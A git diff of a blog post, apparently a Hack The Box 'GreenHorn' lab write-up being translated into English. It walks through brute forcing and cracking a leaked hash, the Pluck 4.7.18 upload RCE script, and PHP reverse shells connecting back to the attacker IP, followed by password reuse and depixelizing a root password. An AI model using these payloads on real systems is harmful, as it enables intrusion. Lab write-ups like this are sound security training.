@@ -4,16 +4,24 @@ title: "GreenHorn"
 date: 2025-09-11 00:00:00 -0400
 author: Hugo Beaulieu
 categories: linux machine
-tags: linux machine
+tags: linux pluck-cms gitea hash-cracking rce password-reuse depixelization pdf-analysis
 ---
 
-Tout d'abord on commence par un scan.
+## Overview
+
+GreenHorn is a Linux machine running Pluck CMS 4.7.18 and Gitea. The exploitation path involves discovering a password hash in a public Gitea repository, cracking it to gain admin access to Pluck CMS, exploiting a file upload vulnerability to achieve RCE, pivoting through password reuse, and ultimately extracting a pixelated password from a PDF using depixelization techniques.
+
+## Initial Enumeration
+
+### Nmap Scan
+
+We begin with an nmap scan to identify open ports and services:
 
 ```bash
 nmap -sV -v 10.10.11.25
 ```
 
-On voit qu'ils y a 3 ports d'ouverts:
+Results:
 
 ```bash
 PORT     STATE SERVICE VERSION
@@ -22,34 +30,46 @@ PORT     STATE SERVICE VERSION
 3000/tcp open  ppp?
 ```
 
-Si on accède le site web au port 80, on se rend compte qu'il s'agit du CMS pluck:
+Three ports are open: SSH on port 22, HTTP on port 80, and an unknown service on port 3000.
+
+### Web Application Discovery
+
+Accessing the website on port 80, we discover it's running **Pluck CMS**:
 
 ```bash
- admin | powered by pluck
+admin | powered by pluck
 ```
 
-Si on accède au port 3000, on se rend compte qu'il s'agit d'une instance de gitea:
+Accessing port 3000, we find a **Gitea** instance:
 
 ```bash
 Powered by Gitea Version: 1.21.11
 ```
 
-On scanne les répertoires pour pluck et gitea, mais rien de bien intéressant:
+### Directory Enumeration
+
+We scan directories for both Pluck and Gitea, but find nothing particularly interesting:
 
 ```bash
 dirb http://greenhorn.htb/
 dirb http://10.10.11.25:3000/
 ```
 
-En accédant à la page de login de pluck, on se rend compte qu'il s'agit de la version 4.7.18:
+## Pluck CMS Analysis
+
+### Version Discovery
+
+Accessing the Pluck login page reveals it's running version **4.7.18**:
 
 ```bash
 http://greenhorn.htb/login.php
 ```
 
-On voit aussi qu'il y a champ pour le mot de passe, pas de username.
+The login form has only a password field, no username field.
 
-En utilisant burp, on essaye un mot de passe bidon et on intercepte la requête:
+### Login Request Analysis
+
+Using Burp Suite, we intercept a login request with a test password:
 
 ```bash
 POST /login.php HTTP/1.1
@@ -70,35 +90,44 @@ Connection: close
 cont1=test&bogus=&submit=Log+in
 ```
 
-On voit que le champ pour le mot de passe se nomme `cont1` et il semble y avoir un champ bogus qui est envoyé aussi pour prévenir le bruteforce.
+The password field is named `cont1`, and there's a `bogus` field, likely for brute-force prevention.
 
-Une fois ces informations en mains, on essaye de cracker le login avec hydra et rockyou.txt:
+### Attempted Brute Force
+
+We try to crack the login with Hydra and rockyou.txt:
 
 ```bash
 hydra -v -V -d -l username -P /home/kali/rockyou.txt -t 16 -m "/login.php:cont1=^PASS^&bogus=&submit=Log+in:F=incorrect" http-post-form://greenhorn.htb
 ```
 
-Cependant, on se rend vite compte qu'il y a une protection contre le bruteforce
+However, we quickly encounter brute-force protection:
 
 ```bash
 You have exceeded the number of login attempts. Please wait 5 minutes before logging in again.
 ```
 
-Ayant épuisé les pistes pour pluck pour le moment, on tourne notre attention vers gitea.
-En fouillant un peu, on trouve un répertoire qui semble héberger le code source pour pluck:
+## Gitea Repository Discovery
+
+Having exhausted leads for Pluck, we turn our attention to Gitea. After exploring, we find a repository that appears to host the Pluck source code:
 
 ```bash
 http://10.10.11.25:3000/GreenAdmin/GreenHorn
 ```
 
-On est en mesure de créer un compte, ajouter une clé ssh et cloner le repo. Malheureusement, il n'est pas possible d'uploader un fichier avec `git push`.
+We can create an account, add an SSH key, and clone the repository. Unfortunately, we can't upload files with `git push`.
 
-En poussant l'exploration du repo plus loin, on trouve 2 fichiers intéressants, token.php et pass.php:
+### Finding Credentials
+
+Exploring the repository further, we discover two interesting files:
+
+**token.php:**
 
 ```php
 http://10.10.11.25:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/token.php
 <?php $token = '65c1e5cf86b4d727962672211b91924b828a0c05ece3954c75e3befa6b361fa3eb28c407f7101bc4eae2c604c96c641575c7fe82dbdc6ce0cf7d4a006f53bac7'; ?>
 ```
+
+**pass.php:**
 
 ```php
 http://10.10.11.25:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php
@@ -107,15 +136,16 @@ $ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c558
 ?>
 ```
 
-On réalise vite que pass.php contient un hash sha-512.
-On tente donc de le décoder avec hashcat et rockyou.txt
+### Hash Cracking
+
+We quickly realize `pass.php` contains a SHA-512 hash. We attempt to decode it with hashcat and rockyou.txt:
 
 ```bash
-echo "65c1e5cf86b4d727962672211b91924b828a0c05ece3954c75e3befa6b361fa3eb28c407f7101bc4eae2c604c96c641575c7fe82dbdc6ce0cf7d4a006f53bac7" > hash.txt
+echo "d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163" > hash.txt
 hashcat -m 1700 -a 0 hash.txt /home/kali/rockyou.txt
 ```
 
-Une fois décodé, on obtient le mot de passe `iloveyou1`:
+Once decoded, we obtain the password `iloveyou1`:
 
 ```bash
 Dictionary cache hit:
@@ -127,17 +157,24 @@ Dictionary cache hit:
 d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163:iloveyou1
 ```
 
-Avec ce mot de passe, on est capable d'accéder à l'admin panel de pluck
+## Gaining Admin Access to Pluck
+
+With this password, we can access Pluck's admin panel:
 
 ```bash
 http://greenhorn.htb/admin.php?action=start
 ```
 
-L'accès à l'admin panel est confirmé. Encherchant un peu, on se rend compte qu'il est possible d'uploader des fichiers depuis l'admin panel. La façon parfaite d'obtenir un reverse shell !
-Depuis l'admin panel, on essaye donc d'uploader un fichier `reverse-shell.php` mais le serveur ajoute automatiquement un `.txt`.
-Différentes extensions donnent le même résultat `(.php5, .php7, .phtml, phar, etc)`. Il faut donc trouver une méthode alternative d'uploader un fichier.
-En fouillant un peu sur `exploit-db.com` on trouve le RCE suivant:
-[upload-reverse-shell.py](https://www.exploit-db.com/exploits/51592)
+Admin access confirmed! After exploring, we discover it's possible to upload files from the admin panel - the perfect way to get a reverse shell!
+
+### File Upload Restrictions
+
+From the admin panel, we try to upload a `reverse-shell.php` file, but the server automatically appends `.txt` to it. Different extensions yield the same result (`.php5`, `.php7`, `.phtml`, `.phar`, etc.). We need to find an alternative upload method.
+
+## CVE Exploitation - RCE via ZIP Upload
+
+Searching on exploit-db.com, we find an RCE exploit:
+[Pluck v4.7.18 - Remote Code Execution](https://www.exploit-db.com/exploits/51592)
 
 ```python
 #Exploit Title: Pluck v4.7.18 - Remote Code Execution (RCE)
@@ -199,7 +236,9 @@ rce=requests.get(rce_url)
 print(rce.text)
 ```
 
-Il ne reste plus qu'à créer le `reverse-shell.zip` avec le `reverse-shell.php` à l'intérieur pour être exécuté par le RCE:
+### Creating the Reverse Shell
+
+We create `reverse-shell.zip` containing `reverse-shell.php`:
 
 ```php
 <?php
@@ -222,19 +261,21 @@ if ($socket) {
 ?>
 ```
 
-Puis, on lance netcat pour écouter les connexions entrantes:
+### Getting a Shell
+
+We start netcat to listen for incoming connections:
 
 ```bash
 nc -lvnp 4444
 ```
 
-On exécute finalement le script `upload-reverse-shell.py`:
+Then execute the upload script:
 
 ```bash
 python upload-reverse-shell.py
 ```
 
-On voit qu'une connexion est établie à netcat:
+A connection is established with netcat:
 
 ```bash
 listening on [any] 4444 ...
@@ -242,7 +283,9 @@ connect to [10.10.14.174] from (UNKNOWN) [10.10.11.25] 51092
 uname -a; w; id; /bin/sh -i
 ```
 
-Une fois dans le serveur, on fait un peu de recon:
+## Shell Upgrade
+
+Once on the server, we perform some reconnaissance:
 
 ```bash
 whoami
@@ -264,66 +307,37 @@ requirements.php
 robots.txt
 ```
 
-On se rend vite compte que le shell est assez limité, `cd` ne fonctionnant pas.
-On vérifie donc quel est notre shell:
+We quickly realize the shell is quite limited - `cd` doesn't work. We check our shell in `/etc/passwd`:
 
 ```bash
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+...
 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-pollinate:x:105:1::/var/cache/pollinate:/bin/false
-sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
-syslog:x:107:113::/home/syslog:/usr/sbin/nologin
-uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
-tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
-tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
-landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
-fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
-usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
-lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
-vboxadd:x:998:1::/var/run/vboxadd:/bin/false
+...
 git:x:114:120:Git Version Control,,,:/home/git:/bin/bash
 mysql:x:115:121:MySQL Server,,,:/nonexistent:/bin/false
 junior:x:1000:1000::/home/junior:/bin/bash
 _laurel:x:997:997::/var/log/laurel:/bin/false
 ```
 
-Notre shell est donc `/usr/sbin/nologin`. Cela signifie que nous serons trop limité dans nos actions. Il faut donc essayer de changer notre shell.
+Our shell is `/usr/sbin/nologin`, which means we're too limited in our actions. We need to change our shell.
 
-Puisque pluck est un CMS codé en php, on tente de créer un deuxième reverse shell avec php pour échapper le premier:
+### Escaping with PHP
+
+Since Pluck is a PHP-based CMS, we create a second reverse shell with PHP to escape the first:
 
 ```php
 php -r '$sock=fsockopen("10.10.14.174",5555);exec("/bin/bash -i <&3 >&3 2>&3");'
 ```
 
-Il ne faut pas oublier de démarrer netcat sur notre machine:
+We start netcat on our machine:
 
 ```bash
 nc -lvnp 5555
 ```
 
-La connexion est établie:
+The connection is established:
 
 ```bash
 listening on [any] 5555 ...
@@ -333,7 +347,11 @@ bash: no job control in this shell
 www-data@greenhorn:~/html/pluck$
 ```
 
-Une fois la connexion établie, on tente de naviguer dans le serveur avec le nouveau shell:
+## Privilege Escalation to Junior
+
+### System Exploration
+
+Once connected with the new shell, we navigate the server:
 
 ```bash
 www-data@greenhorn:~/html/pluck$ cd /
@@ -369,7 +387,7 @@ drwxr-xr-x  14 root root  4096 Jun 20 06:36 usr
 drwxr-xr-x  13 root root  4096 Jun 20 06:36 var
 ```
 
-Dans `/home` on trouve le répertoire `junior` qui contient un fichier `user.txt` (probablement le flag user):
+In `/home` we find the `junior` directory containing a `user.txt` file (likely the user flag):
 
 ```bash
 www-data@greenhorn:/$ ls -la /home
@@ -390,17 +408,18 @@ drwx------ 2 junior junior  4096 Jun 20 06:36 .cache
 -rw-r----- 1 root   junior    33 Jul 25 02:48 user.txt
 ```
 
-Il faudrait donc réussir à se connecter avec l'utilisateur `junior` pour voir le flag.
+We need to become the user `junior` to view the flag.
 
-On va utiliser [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) pour trouver des vulnérabilités pour l'escalation de privilège.
-Pour le transférer sur la machine, on va télécharger le script sur notre machine et le servir:
+### LinPEAS Enumeration
+
+We use [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) to find privilege escalation vulnerabilities. We download the script on our machine and serve it:
 
 ```bash
 wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 sudo python3 -m http.server 80
 ```
 
-Par la suite, depuis le serveur, on va télécharger `linPEAS.sh`:
+From the target server, we download LinPEAS:
 
 ```bash
 cd /tmp
@@ -408,7 +427,7 @@ wget 10.10.14.174/linpeas.sh
 chmod +x linpeas.sh
 ```
 
-Puis, on va l'exécuter:
+Then execute it:
 
 ```bash
 ./linpeas.sh
@@ -424,10 +443,11 @@ Puis, on va l'exécuter:
 git         1090  0.1  4.2 2063276 168748 ?      Ssl  05:43   0:01 /usr/local/bin/gitea web --config /etc/gitea/app.ini
 ```
 
-En examinant les permissions sur le fichier, on dirait que junior a installé gitea mais a mal configuré les permission.
-On semble pouvoir écrire sur le fichier `/usr/local/bin/gitea`, qui est lui appelé par le service `/etc/systemd/system/gitea.service`.
+Examining the permissions, it appears junior installed Gitea but misconfigured the permissions. We can write to `/usr/local/bin/gitea`, which is called by `/etc/systemd/system/gitea.service`.
 
-Puisque c'est lui qui a configuré gitea et que selon le commit c'est lui qui a uploadé le fichier `pass.php` que nous avons cracké plus tôt, on réessaye le même mot de passe, `iloveyou1`:
+### Password Reuse
+
+Since junior configured Gitea and uploaded the `pass.php` file we cracked earlier, we try the same password, `iloveyou1`:
 
 ```bash
 www-data@greenhorn:/$ su junior
@@ -445,7 +465,7 @@ dr-xr-xr-x   2 root root  4096 Jun 20 06:36 cdrom
 drwxr-xr-x   2 root root  4096 Jun 20 06:36 data
 drwxr-xr-x  20 root root  4020 Jul 25 02:41 dev
 drwxr-xr-x 107 root root  4096 Jul 15 05:42 etc
-drwxr-xr-x   4 root root  4096 Jun 20 06:36 home
+drwxr-xr-x   4 root   root   4096 Jun 20 06:36 home
 lrwxrwxrwx   1 root root     7 Feb 16 18:37 lib -> usr/lib
 lrwxrwxrwx   1 root root     9 Feb 16 18:37 lib32 -> usr/lib32
 lrwxrwxrwx   1 root root     9 Feb 16 18:37 lib64 -> usr/lib64
@@ -465,7 +485,11 @@ drwxr-xr-x  14 root root  4096 Jun 20 06:36 usr
 drwxr-xr-x  13 root root  4096 Jun 20 06:36 var
 ```
 
-Une fois connecté en tant que `junior`, on va afficher le flag utilisateur:
+Success!
+
+### User Flag
+
+Once logged in as `junior`, we retrieve the user flag:
 
 ```bash
 cd /home/junior
@@ -473,10 +497,14 @@ ls
 user.txt
 Using OpenVAS.pdf
 cat user.txt
-0dda172dbf48af3adec9fa5e73b7a090
+[REDACTED]
 ```
 
-Une fois le flag utilisateur validé, on reporte notre attention sur les 2 services qui nous intéressent:
+## Privilege Escalation to Root
+
+### Investigating Gitea Services
+
+Once the user flag is validated, we turn our attention to the two Gitea services:
 
 ```bash
 cat /etc/systemd/system/gitea.service | grep User=
@@ -486,26 +514,27 @@ cat /etc/systemd/system/multi-user.target.wants/gitea.service | grep User=
 User=git
 ```
 
-On voit que les 2 services sont exécutés par l'utilisateur git.
-Il faudrait donc modifier `/usr/local/bin/gitea` qui est appelé par ces services.
+Both services run as the `git` user. We should modify `/usr/local/bin/gitea` which is called by these services.
 
-Cependant, un test rapide nous informe qu'il est impossible de modifier le fichier:
+However, a quick test reveals we can't modify the file:
 
 ```bash
 echo test > /usr/local/bin/gitea
 bash: line 19: /usr/local/bin/gitea: Text file busy
 ```
 
-À ce stade-ci gitea semble être une fausse piste.
-Faute de succès, on retourne donc dans le répertoire de junior.
-N'ayant pas encore exploré le fichier `Using OpenVAS.pdf`, on le télécharge pour y jeter un coup d'oeil:
+At this point, Gitea appears to be a dead end. We return to junior's home directory.
+
+### PDF Analysis
+
+Having not yet explored the `Using OpenVAS.pdf` file, we download it to examine it:
 
 ```bash
 nc -lvp 1234 > "/home/junior/Using OpenVAS.pdf"
 nc 10.10.14.3 1234 < "/home/kali/Using OpenVAS.pdf"
 ```
 
-Celui-ci contient une commande et un mot de passe, mais il est pixelisé:
+The PDF contains a command and a password, but it's pixelated:
 
 ```bash
 Hello junior,
@@ -522,13 +551,15 @@ Have a great week,
 Mr. Green
 ```
 
-On extrait l'image du pdf avec pdfimages:
+### Depixelization
+
+We extract the image from the PDF using pdfimages:
 
 ```bash
 pdfimages -all 'Using OpenVAS.pdf' password
 ```
 
-On essaye de dépixeliser l'image avec `depix`:
+We attempt to depixelate the image using `depix`:
 
 ```bash
 python3 depix.py \
@@ -537,7 +568,9 @@ python3 depix.py \
 -o ./password-output.png
 ```
 
-On essaye le mot de passe pour se connecter en root et afficher le flag:
+### Root Flag
+
+We try the depixelated password to connect as root and display the flag:
 
 ```bash
 su
@@ -550,7 +583,19 @@ cleanup.sh
 restart.sh
 root.txt
 cat root.txt
-b390f94571b11bf6e7cb7c9061fcb113
+[REDACTED]
 ```
 
-![image](https://github.com/user-attachments/assets/81a2386c-4f0a-43de-998d-58196faab226)
+Success! We've obtained root access.
+
+## Key Takeaways
+
+- **Public repositories** can expose sensitive configuration files and credentials
+- **SHA-512 hashes** can be cracked with tools like hashcat when weak passwords are used
+- **Pluck CMS 4.7.18** allows authenticated file upload via ZIP modules for RCE
+- **Shell limitations** (like /usr/sbin/nologin) can be bypassed by spawning new shells
+- **Password reuse** across different services is a common security weakness
+- **Pixelated passwords** in PDFs can be recovered using depixelization tools like depix
+- **PDF metadata and embedded images** should be scrubbed before sharing sensitive documents
+- **File permissions** on service binaries should be carefully configured
+- **Gitea repositories** can leak application source code and credentials
